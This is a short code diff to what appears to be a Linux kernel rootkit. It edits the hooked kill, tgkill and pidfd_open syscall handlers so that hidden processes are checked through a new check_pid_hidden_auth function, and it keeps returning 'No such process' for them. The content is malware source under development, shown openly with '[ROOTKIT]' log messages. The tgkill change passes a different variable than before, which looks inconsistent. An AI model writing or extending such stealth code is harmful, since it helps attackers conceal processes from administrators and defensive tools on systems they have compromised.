@@ -36,7 +36,7 @@ do_tgkill(sysfun_t orig_func, struct pt_regs *p_regs, pid_t i32_tgid, pid_t i32_
     rcu_read_unlock();
 
     if (i32_tgid <= 0 || i32_tgid == i32_tgid2) {
-        IF_U (is_pid_hidden(i32_tgid)) {
+        IF_U (check_pid_hidden_auth(i32_pid)) {
             pr_info("[ROOTKIT] * Intercepted signal %d for hidden PID %d\n", i32_sig, i32_tgid);
             return -ESRCH;
         }
@@ -63,7 +63,7 @@ SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
     }
 
     // Check if the process is hidden; if so, return -ESRCH (No such process)
-    IF_U (is_pid_hidden(i32_pid)) {
+    IF_U (check_pid_hidden_auth(i32_pid)) {
         pr_info("[ROOTKIT] * Intercepted signal %d for hidden PID %d\n", i32_sig, i32_pid);
         return -ESRCH;
     }
@@ -115,7 +115,7 @@ SYSCALL_HOOK_HANDLER2(pidfd_open, orig_pidfd_open, p_regs, pid_t, i32_pid, unsig
         return -EINVAL;
     }
 
-    IF_U (is_pid_hidden(i32_pid)) {
+    IF_U (check_pid_hidden_auth(i32_pid)) {
         return -ESRCH;
     }
 
